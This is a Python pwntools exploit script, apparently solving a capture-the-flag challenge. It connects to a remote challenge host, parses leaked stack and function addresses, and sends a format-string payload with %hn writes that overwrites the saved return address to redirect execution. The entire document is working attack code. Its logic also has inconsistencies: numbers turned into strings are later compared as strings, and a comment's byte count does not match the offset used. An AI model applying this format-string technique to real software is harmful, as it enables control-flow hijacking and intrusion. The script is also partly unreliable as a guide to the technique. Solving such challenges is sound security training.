from pwn import *

elf = ELF('./task')
# p = elf.process()
p = remote('rivit.dev', 10016)

# Format string to overwrite
p.recvuntil(b'Address of victory: ')
addr_vic = p.recvline().strip().decode('utf-8')[2::]
print(addr_vic)
lv = int(addr_vic[4:], 16)
hv = int(addr_vic[:4], 16)

if (hv > lv):
    hv = hv - lv
    hv = str(hv)
    lv = str(lv)
else:
    lv = lv - hv
    lv = str(lv)
    hv = str(hv)

length = 16 + len(lv) + len(hv)  # 16 for %x%14$hn and %x%15$hn
first_arg = 7 + (length // 4) if length % 4 == 0 else 8 + (length // 4)
second_arg = first_arg + 1

padding = 4 - (length % 4) if length % 4 != 0 else 0


p.recvuntil(b'Address of buf: ')
addr_buf = p.recvline().strip().decode('utf-8')[2::]
print(f'Address of buf: {addr_buf}')
addr_buf = int(addr_buf, 16)

addr_to_ret = addr_buf + 144  # buf is 128 bytes, using stack, we need 20 more bytes to reach the return address

p.recvuntil(b'Return address: ')
addr_ret = p.recvline().strip().decode('utf-8')[2::]
print(f'Return address: {addr_ret}')
addr_ret = int(addr_ret, 16)

# 7th argument is the address of buf
# %{lv}x%{first_arg}$hn %{hv}x%{second_arg}$hnA ret ret

if hv > lv:
    payload = b''.join(
        [
            b'%',
            str(lv).encode(),
            b'x%',
            str(first_arg).encode(),
            b'$hn',
            b'%',
            str(hv).encode(),
            b'x%',
            str(second_arg).encode(),
            b'$hn',
            b'A' * padding,  # Padding to fill the buffer
            p32(addr_to_ret),
            p32(addr_to_ret + 2),
        ]
    )
else:
    payload = b''.join(
        [
            b'%',
            str(hv).encode(),
            b'x%',
            str(first_arg).encode(),
            b'$hn',
            b'%',
            str(lv).encode(),
            b'x%',
            str(second_arg).encode(),
            b'$hn',
            b'A' * padding,  # Padding to fill the buffer
            p32(addr_to_ret + 2),
            p32(addr_to_ret),
        ]
    )

print(f'Payload: {payload}')

p.sendline(payload)
p.recvuntil(b'Return address: ')
p.interactive()
